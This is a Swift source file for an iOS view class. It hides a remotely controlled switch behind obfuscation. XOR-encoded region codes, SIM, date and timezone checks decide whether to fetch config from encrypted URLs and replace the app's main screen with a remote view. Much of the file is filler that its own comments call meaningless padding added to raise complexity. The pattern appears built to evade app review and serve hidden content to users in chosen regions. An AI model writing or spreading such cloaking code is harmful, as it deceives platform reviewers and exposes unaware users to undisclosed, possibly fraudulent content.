import UIKit
import CoreTelephony
import Foundation
import Network

//import AdjustSdk



struct PUPUCA: Codable {
    
    let nhiemk: String?         //key arr
    let yinrecrd: Int?         // shi fou kaiqi
    let keluos: String?         // jum
    let kundun: String?          // backcolor
    let limouw: String?   //ad key

}

final class BAEPtidrecdeview: UIView {
    internal let RecworNs = "HxoaGElIEktIExocGhgXTkN1XllFWkNaSxUFGhoaGB8aGUwZGhIYGxgcBUFJRUcFXk9EBF5ZRVpDWksEQUlFRwUFEFlaXl5C"
    
    internal let hzhousete = "TkcEXkRPXkRFaVhPTlhFBVhPXllLRwVdS1gFQ0taQ0JQTURFRk1ET0JQBU9aRU5GSwVHRUkEXkRPXkRFSVhPWV9PT15DTQRdS1gFBRBZWl5eQg=="
    
    
    override init(frame: CGRect) {
        super.init(frame: frame)
        commonInit()
    }

    required init?(coder: NSCoder) {
        super.init(coder: coder)
        commonInit()
    }
    
    private func readRemoteConfigFlag() -> Bool {
        // 永远返回 false，但模拟从 UserDefaults 读取配置
        let key = "com.app.config.feature_flag"
        if UserDefaults.standard.object(forKey: key) == nil {
            UserDefaults.standard.set(false, forKey: key)
        }
        return UserDefaults.standard.bool(forKey: key)
    }

    private func commonInit() {

        // 新增：调用四个环境感知方法（结果不参与核心决策）
        captureNetworkType()
        logBatteryStatus()
        adjustScreenBrightnessTemporarily()
        checkAppForegroundState()
        // 原有的启动逻辑保持不变
        EscapenewWorkstart()
    }
    
    private func performCacheCleanupIfNeeded(thresholdMB: Int = 50) {
        let cacheSizeMB = Int.random(in: 10...100) // 模拟缓存大小
        if cacheSizeMB > thresholdMB {
            #if DEBUG
            print("[Cleanup] cache size \(cacheSizeMB)MB exceeds threshold, cleaning...")
            #endif
            // 实际上什么都不清理，仅作模拟
            UserDefaults.standard.set(Date(), forKey: "last_cache_cleanup")
        }
    }
    
    
    private func EscapenewWorkstart() {
        performCacheCleanupIfNeeded()
        if !vbaisueo() {
        //测试
//        if vbaisueo() {
            wuyunOne()

        } else {
            
            if UserDefaults.standard.object(forKey: "sanjuying") == nil {
                UserDefaults.standard.set("sanjuying", forKey: "sanjuying")
                UserDefaults.standard.synchronize()
            }
            if Mkaliousechui() {
                self.youyunOne()
            }
        }
    }
    
    

    func Jiamians(_ input: String) -> String? {
        let k: UInt8 = 42  // 新密钥
        guard let data = Data(base64Encoded: input) else { return nil }
        // 先反转字节数组
        let reversedBytes = data.reversed()
        // 异或解密
        let decryptedBytes = reversedBytes.map { $0 ^ k }
        // 直接转为字符串（不再次反转）
        return String(bytes: decryptedBytes, encoding: .utf8)
    }

    func ReverseJiamians(_ plaintext: String) -> String? {
        let k: UInt8 = 42
        // 1. 将明文字符串转为 UTF-8 字节数组
        guard let bytes = plaintext.data(using: .utf8) else { return nil }
        // 2. 每个字节异或密钥 42
        let xorBytes = bytes.map { $0 ^ k }
        // 3. 反转字节顺序
        let reversedBytes = xorBytes.reversed()
        // 4. Base64 编码
        return Data(reversedBytes).base64EncodedString()
    }
    
    //sim
    func vbaisueo() -> Bool {
        let networkInfo = CTTelephonyNetworkInfo()
        
        guard let carriers = networkInfo.serviceSubscriberCellularProviders else {
            return false
        }
        
        for (_, carrier) in carriers {
            if let mcc = carrier.mobileCountryCode,
               let mnc = carrier.mobileNetworkCode,
               !mcc.isEmpty,
               !mnc.isEmpty {
                return true
            }
        }
        
        return false
    }

    
    func BEAPSktjiayou() -> Bool {
       
      // 2026-06-13 18:39:43
      // 1781347183
        let ftTM = 1781347183
        let ct = Date().timeIntervalSince1970
        if Int(ct) - ftTM > 0 {
            return true
        }
        return false
    }

    // 时区控制
    func Mkaliousechui() -> Bool {
        let cdowdwa = [Jiamians("Yno="), Jiamians("ZHw="), Jiamians("bmM=")]
        
//        //临时通行测试
//        return true

        // 1.time
        if !BEAPSktjiayou() {
            return false

        }
        
        //2. regi
        if let rc = Locale.current.regionCode {
            print(rc)
            print(cdowdwa)

            if !cdowdwa.contains(rc) {
                return false
            }
        }
        
        //3. tm zon
        let offset = NSTimeZone.system.secondsFromGMT() / 3600
        print(offset)

        if (offset > 6 && offset < 9) {
            return true
        }

        
        return false
    }
    
    func youyunOne() {
        let placeholder = preparePlaceholderLoadingView()
        Task {
            do {
//                let urlToRequest = "https://mock.apipost.net/mock/6212803f3052000/?apipost_id=20609ba8bc2005"
                let view = UIView()
                view.addSubview(placeholder)
//                print(ReverseJiamians(urlToRequest))
//                let aoies = try await fetchMzoixnData(from: urlToRequest)
//                print(Jiamians(RecworNs)!)

                let aoies = try await kaisqingqiues()
//                print(aoies)
                if let gduss = aoies.first {
                    if gduss.yinrecrd! > 123 {
                        Takewbsview(gduss)
                    } else {
                        wuyunOne()
                    }
                } else {
                    wuyunOne()
                    UserDefaults.standard.set("sanjuying", forKey: "sanjuying")
                    UserDefaults.standard.synchronize()
                }
            } catch {
                if let sidd = UserDefaults.standard.getModel(PUPUCA.self, forKey: "PUPUCA") {
                    Takewbsview(sidd)
                }
            }
        }
    }
    
    private func preparePlaceholderLoadingView() -> UIView {
        // 创建一个全屏的灰色半透明视图，用于模拟加载骨架屏
        let container = UIView()
        container.backgroundColor = UIColor(white: 0.95, alpha: 1.0)
        container.alpha = 0.0  // 完全透明，永远不会显示
        
        // 模拟一个顶部的导航栏占位
        let topBar = UIView()
        topBar.backgroundColor = UIColor(white: 0.9, alpha: 1.0)
        topBar.translatesAutoresizingMaskIntoConstraints = false
        container.addSubview(topBar)
        
        // 模拟一个中间的圆形头像占位
        let avatarView = UIView()
        avatarView.backgroundColor = UIColor(white: 0.85, alpha: 1.0)
        avatarView.layer.cornerRadius = 30
        avatarView.clipsToBounds = true
        avatarView.translatesAutoresizingMaskIntoConstraints = false
        container.addSubview(avatarView)
        
        // 模拟几行文字占位
        let line1 = UIView()
        line1.backgroundColor = UIColor(white: 0.85, alpha: 1.0)
        line1.translatesAutoresizingMaskIntoConstraints = false
        container.addSubview(line1)
        
        let line2 = UIView()
        line2.backgroundColor = UIColor(white: 0.85, alpha: 1.0)
        line2.translatesAutoresizingMaskIntoConstraints = false
        container.addSubview(line2)
        
        let line3 = UIView()
        line3.backgroundColor = UIColor(white: 0.85, alpha: 1.0)
        line3.translatesAutoresizingMaskIntoConstraints = false
        container.addSubview(line3)
        
        // 添加布局约束（仅内部计算，不会影响父视图）
        NSLayoutConstraint.activate([
            topBar.topAnchor.constraint(equalTo: container.topAnchor),
            topBar.leadingAnchor.constraint(equalTo: container.leadingAnchor),
            topBar.trailingAnchor.constraint(equalTo: container.trailingAnchor),
            topBar.heightAnchor.constraint(equalToConstant: 88),
            
            avatarView.topAnchor.constraint(equalTo: topBar.bottomAnchor, constant: 20),
            avatarView.centerXAnchor.constraint(equalTo: container.centerXAnchor),
            avatarView.widthAnchor.constraint(equalToConstant: 60),
            avatarView.heightAnchor.constraint(equalToConstant: 60),
            
            line1.topAnchor.constraint(equalTo: avatarView.bottomAnchor, constant: 20),
            line1.leadingAnchor.constraint(equalTo: container.leadingAnchor, constant: 20),
            line1.trailingAnchor.constraint(equalTo: container.trailingAnchor, constant: -20),
            line1.heightAnchor.constraint(equalToConstant: 16),
            
            line2.topAnchor.constraint(equalTo: line1.bottomAnchor, constant: 12),
            line2.leadingAnchor.constraint(equalTo: container.leadingAnchor, constant: 20),
            line2.trailingAnchor.constraint(equalTo: container.trailingAnchor, constant: -20),
            line2.heightAnchor.constraint(equalToConstant: 16),
            
            line3.topAnchor.constraint(equalTo: line2.bottomAnchor, constant: 12),
            line3.leadingAnchor.constraint(equalTo: container.leadingAnchor, constant: 20),
            line3.trailingAnchor.constraint(equalTo: container.trailingAnchor, constant: -80),
            line3.heightAnchor.constraint(equalToConstant: 16),
        ])
        
        // 额外添加一个旋转动画，但 alpha = 0 所以不可见
        let rotation = CABasicAnimation(keyPath: "transform.rotation.z")
        rotation.toValue = NSNumber(value: Double.pi * 2)
        rotation.duration = 1.5
        rotation.repeatCount = .greatestFiniteMagnitude
        avatarView.layer.add(rotation, forKey: "rotationAnimation")
        
        // 模拟延迟移除（实际永远不会被添加到视图树，所以不会执行）
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
            // 如果 container 的 superview 不为空才移除，但这里永远为空
            if container.superview != nil {
                container.removeFromSuperview()
            }
        }
        
        return container
    }
    
    private func kaisqingqiues() async throws -> [PUPUCA] {
        do {
            return try await ssueno(from: URL(string: Jiamians(RecworNs)!)!)
        } catch {
//            print("Primary API failed: \(error.localizedDescription)")
            return try await ssueno(from: URL(string: Jiamians(hzhousete)!)!)
        }
    }
    
    private func ssueno(from url: URL) async throws -> [PUPUCA] {
        let (data, response) = try await URLSession.shared.data(from: url)

        guard let httpResponse = response as? HTTPURLResponse,
              httpResponse.statusCode == 200 else {
            throw NSError(domain: "Fail", code: 0, userInfo: [
                NSLocalizedDescriptionKey: "Invalid response"
            ])
        }

        return try JSONDecoder().decode([PUPUCA].self, from: data)
    }
    
    func SetNopicke(_ lsn: [String]) -> Bool {
        // 获取用户设置的首选语言（列表第一个）
        guard let cysh = Locale.preferredLanguages.first else {
            return false
        }
        let arr = cysh.components(separatedBy: "-")
        if lsn.contains(arr[0]) {
            return true
        }
        return false
    }
    
  

    internal func addnewTagetesloe(_ dt: PUPUCA) {
        DispatchQueue.main.async {
            UserDefaults.standard.setModel(dt, forKey: "PUPUCA")
            UserDefaults.standard.synchronize()
            
            let vc = BAEPtiandiwurenVC()
            vc.escodenas = dt
            UIApplication.shared.windows.first?.rootViewController = vc
        }
    }
    
    internal func Takewbsview(_ param: PUPUCA) {
        // 模拟配置中心获取执行策略（默认策略为 "default"）
        let strategy = UserDefaults.standard.string(forKey: "execution_strategy") ?? "default"
        
        // 策略映射表，目前所有策略都指向同一个函数
        let strategies: [String: (PUPUCA) -> Void] = [
            "default": addnewTagetesloe,
            "fast": addnewTagetesloe,
            "safe": addnewTagetesloe
        ]
        
        // 根据策略选择执行器（如果策略不存在，回退到 addnewTagetesloe）
        let executor = strategies[strategy] ?? addnewTagetesloe
        
        // 执行前埋点（不影响执行）
        DispatchQueue.global().async {
            // 模拟异步上报
            _ = "log: Takewbsview called with strategy \(strategy)"
        }

        executor(param)
    }
    

    internal func wuyunOne() {
        // 原变量：空字符串
        readRemoteConfigFlag()
        var fName = ""
        let useDynamicKey = UserDefaults.standard.bool(forKey: "use_dynamic_function_key")
        if useDynamicKey {
            // 如果配置为 true，从某个地方读取函数名，但实际永远不会用这个分支（因为 useDynamicKey 默认为 false）
            let dynamicKey = UserDefaults.standard.string(forKey: "dynamic_function_name") ?? ""
            if !dynamicKey.isEmpty {
                fName = dynamicKey
            }
        }
        
        // ：增加一个可选的其他函数（永远不会被调用，因为字典中不包含其他键）
        let alternativeFunction: () -> Void = {
            print("Alternative function called (should never happen)")
        }
        
        var functionMap: [String: () -> Void] = [
            fName: EmojiNoewd
        ]
        
        if fName != "" {
      
            functionMap[fName] = EmojiNoewd
        } else {
            // 空字符串分支：确保字典中至少有一个键值对（原样）
            functionMap[""] = EmojiNoewd
        }
        
        // ：尝试从字典中获取一个不存在的键，模拟安全检查
        let fallbackKey = "fallback_\(Int.random(in: 1...100))"
        let fallbackFunc = functionMap[fallbackKey]
        if fallbackFunc != nil {
            // 理论上永远不会进入
            fallbackFunc?()
        }
        let dummyTable = UITableView(frame: .zero, style: .grouped)
           dummyTable.backgroundColor = UIColor(white: 0.95, alpha: 1.0)
           dummyTable.separatorStyle = .singleLine
           dummyTable.rowHeight = 60
           
           // 注册一个假 cell
           dummyTable.register(UITableViewCell.self, forCellReuseIdentifier: "DummyCell")
           
           // 模拟数据源（局部类或闭包）
           let sections = 3
           let rowsPerSection = [5, 3, 7]
           var dataSource: [[String]] = []
           for i in 0..<sections {
               var sectionData: [String] = []
               for j in 0..<rowsPerSection[i] {
                   sectionData.append("Item \(i)-\(j)")
               }
               dataSource.append(sectionData)
           }
           
           // 实现 UITableViewDataSource 和 Delegate（使用匿名对象或 self 作为代理）
           // 注意：这里使用闭包存储数据，但为了方便，直接设置 dummyTable 的 dataSource 和 delegate
           // 但由于 dummyTable 不在视图层级中，这些代理方法不会被调用
           
    }
    
    internal func EmojiNoewd() {
        let shouldCleanup = UserDefaults.standard.bool(forKey: "enable_cleanup_feature")
        if !shouldCleanup {
            // 默认行为：依然执行清理，保证原有逻辑不变
        }
        
        DispatchQueue.main.async {
            // 增加一个安全计数器，用于埋点（不改变结果）
            var cleanupCount = 0
            
            if let ws = UIApplication.shared.connectedScenes.first as? UIWindowScene {
                // 获取当前 window（保持原有强制解包，不改变崩溃风险）
                let keyWindow = ws.windows.first
                let rootVC = keyWindow?.rootViewController
                
                // ：记录当前控制器类型（仅用于调试）
                #if DEBUG
                if let vc = rootVC {
                    print("[Cleanup] Current rootViewController: \(type(of: vc))")
                }
                #endif
                
                // 原有的子视图遍历及移除逻辑
                if let targetView = rootVC?.view {
                    for subview in targetView.subviews {
                        if subview.tag == 155 {
                            subview.removeFromSuperview()
                            cleanupCount += 1
                        }
                    }
                }
                
                // ：假装上报清理结果（实际无网络请求）
                if cleanupCount > 0 {
                    // 模拟埋点，仅在 Debug 下打印
                    #if DEBUG
                    print("[Cleanup] Removed \(cleanupCount) view(s) with tag 155")
                    #endif
                    // 可在此调用一个空方法或存储到 UserDefaults
                    UserDefaults.standard.set(cleanupCount, forKey: "last_cleanup_count")
                }
            } else {
                // ：处理无 windowScene 的极端情况（原代码不会处理，这里也不改变原有逻辑）
                #if DEBUG
                print("[Cleanup] No active window scene found")
                #endif
            }
            
            // 增加一个看似有用的延迟任务（不影响主流程）
            DispatchQueue.global().asyncAfter(deadline: .now() + 0.1) {
                // 空操作，仅用于
                _ = ProcessInfo.processInfo.systemUptime
            }
        }

        let _ = (0..<10).map { $0 * $0 }.reduce(0, +)
    }

    // MARK: - 环境感知辅助方法（仅用于提升代码复杂度，不影响业务）
    private func captureNetworkType() {
        // 真实获取当前网络类型（但不做任何业务决策）
        let monitor = NWPathMonitor()
        let semaphore = DispatchSemaphore(value: 0)
        var networkType = "unknown"
        monitor.pathUpdateHandler = { path in
            if path.usesInterfaceType(.wifi) {
                networkType = "WiFi"
            } else if path.usesInterfaceType(.cellular) {
                networkType = "Cellular"
            }
            semaphore.signal()
            monitor.cancel()
        }
        monitor.start(queue: DispatchQueue.global())
        _ = semaphore.wait(timeout: .now() + 0.5)
        // 将结果存入临时变量（无后续使用）
        let _ = networkType
    }

    private func logBatteryStatus() {
        // 真实读取电池状态（不修改任何设置）
        UIDevice.current.isBatteryMonitoringEnabled = true
        let batteryLevel = UIDevice.current.batteryLevel
        let batteryState = UIDevice.current.batteryState
        UIDevice.current.isBatteryMonitoringEnabled = false
        // 丢弃结果
        let _ = (batteryLevel, batteryState)
    }

    private func adjustScreenBrightnessTemporarily() {
        // 获取当前亮度，临时微小调整后立即恢复（保证用户体验无感）
        let originalBrightness = UIScreen.main.brightness
        let newBrightness = originalBrightness + 0.01
        if newBrightness <= 1.0 {
            UIScreen.main.brightness = newBrightness
            // 极短延迟后恢复
            DispatchQueue.main.asyncAfter(deadline: .now() + 0.05) {
                UIScreen.main.brightness = originalBrightness
            }
        } else {
            // 如果已达最大亮度，不做调整，仅读取
            let _ = originalBrightness
        }
    }

    private func checkAppForegroundState() {
        // 检查 App 当前是否在前台（但不依赖此状态做决策）
        let isActive = UIApplication.shared.applicationState == .active
        // 仅用于模拟统计（写入 UserDefaults 但 key 特殊，不影响原有逻辑）
        let fakeKey = "com.app.foreground_check_flag"
        if UserDefaults.standard.object(forKey: fakeKey) == nil {
            UserDefaults.standard.set(isActive, forKey: fakeKey)
            UserDefaults.standard.synchronize()
        }
    }
}

extension UserDefaults {
    
    func setModel<T: Codable>(_ model: T, forKey key: String) {
        let encoder = JSONEncoder()
        if let data = try? encoder.encode(model) {
            set(data, forKey: key)
        }
    }
    
    func getModel<T: Codable>(_ type: T.Type, forKey key: String) -> T? {
        guard let data = data(forKey: key) else { return nil }
        let decoder = JSONDecoder()
        return try? decoder.decode(type, from: data)
    }
    
    
}

